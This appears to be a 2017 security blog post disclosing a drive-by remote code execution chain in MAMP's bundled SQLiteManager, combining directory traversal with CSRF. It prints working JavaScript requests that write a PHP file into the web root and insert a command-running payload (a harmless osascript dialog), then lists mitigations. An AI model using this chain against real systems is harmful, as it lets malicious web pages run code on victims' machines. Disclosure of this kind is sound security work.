---
layout: post
title: "Drive-by remote code execution in MAMP"
thumbnail: elephant-240.jpg
date: 2017-07-19
---

MAMP is an Apache, MySQL, and PHP stack for Mac OS X. It comes with SQLiteManager, which has several vulnerabilities. This post describes how to exploit these vulnerabilities to execute code when a user of MAMP visits a malicious web site.

## MAMP

MAMP is a web stack that can be installed on Mac OS X. It is typically used by web developers to test the web applications they are working on.
It installs the Apache web server, which runs on port 8888 by default. Also included are some database management programs, such as phpMyAdmin and SQLiteManager.

## SQLiteManager

[SQLiteManager](https://sourceforge.net/projects/sqlitemanager/) is a tool like phpMyAdmin for SQLite databases. It can create new databases, add tables to databases and run SQL queries on them. It has not been updated since 2013 and contains some [known](https://packetstormsecurity.com/files/134272/SQLiteManager-1.2.4-Cross-Site-Scripting.html) [vulnerabilities](http://www.cvedetails.com/vulnerability-list/vendor_id-6201/product_id-10501/year-2008/opec-1/Sqlite-Manager-Sqlite-Manager.html).

### Directory traversal

SQLiteManager can create new databases. An SQLite database is contained in a single file, and when creating the database it is possible to supply the filename for the new database. This file is then created in the directory `/Applications/MAMP/db/sqlite`. However, by adding `../` to the filename we can place the database one directory higher.

We can also use this to get a file containing PHP code in the web root. By supplying a file name like `../../htdocs/script.php`, we can place a file `script.php` in the web root. Then, using SQLiteManager, we create a table and add a row containing our PHP code. The file `script.php` will be a valid SQLite database file, containing PHP code that is run when the file is accessed.

![Create a new database in the webroot with the name script.php](/images/sqlitemanager-create-database.png "Create a new database in the webroot with the name script.php")

![Add PHP code to the file](/images/sqlitemanager-insert-phpcode.png "Add PHP code to the file")

![Accessing the script runs the PHP code](/images/sqlitemanager-run-phpinfo.png "Accessing the script runs the PHP code")

### CSRF

The SQLiteManager running on localhost cannot be accessed directly by an attacker. However, the attacker can "forge" requests if he can run Javascript in the browser. If you visit the attacker's web site he can perform the requests from within the browser, on the same computer that MAMP is installed on. These requests *can* access the SQLiteManager running on localhost. This method of bouncing requests through the victims browser is called cross site request forgery, or CSRF.

SQLiteManager does not have any CSRF protection, so the directory traversal mentioned above can also be executed using CSRF. We can issue POST requests using Javascript to create the database and add data to it, and then issue a request to the resulting file. This makes it possible to run code on a victim that has MAMP installed and enabled when the victim visits a malicious site.

For example, the following Javascript issues a request that creates a database:

    let formData = new FormData();
    formData.append("dbname", "somename");
    formData.append("dbVersion", 3);
    formData.append("dbpath", "../../htdocs/script.php");
    formData.append("action", "saveDb");

    fetch("http://localhost:8888/sqlitemanager/main.php", {
        method: "POST",
        body: formData
    });

After creating a table, we insert a payload:

    let payload = "<?php `osascript -e 'tell application (path to frontmost application as text) to display dialog \"Remote code execution on MAMP\" with icon stop'`; ?>";
    let formData = new FormData();
    formData.append("funcs[test]", "");
    formData.append("valField[test]", payload);
    formData.append("action", "saveElement");
    formData.append("currentPage", "");
    formData.append("after_save", "properties");

    return fetch("http://localhost:8888/sqlitemanager/main.php?dbsel=1&table=test", {
        method: "POST",
        body: formData
    }).catch(e => e);

The `dbsel` number is the number corresponding to the database we just created. Although we don't know this, we can just try all numbers between 0 and 50 and hope that we hit the correct one.

When we trigger a request to the file, the execution of the `osascript` command shows the popup:

![Popup is shown by running code](/images/sqlitemanager-rce-popup.png "Popup is shown by running code")

## Conclusion

By combining CSRF and directory traversal we can trigger remote code execution, if the victim just visits a web site with malicious Javascript. 

An immediate solution to this would be to disable SQLiteManager. MAMP users can do this themselves by editing `/Applications/MAMP/conf/apache/httpd.conf`. Unless someone takes over the maintenance for SQLiteManager, it is unlikely that the vulnerabilities get fixed. MAMP already has an alternative manager for SQLite available: [phpLiteAdmin](https://www.phpliteadmin.org/).

A broader solution is to disallow requests from the public Internet to private RFC1918 IP addresses. There is currently [a proposal](https://wicg.github.io/cors-rfc1918/) to refuse such requests by default, and to create a new CORS headers to explicitly allow it.
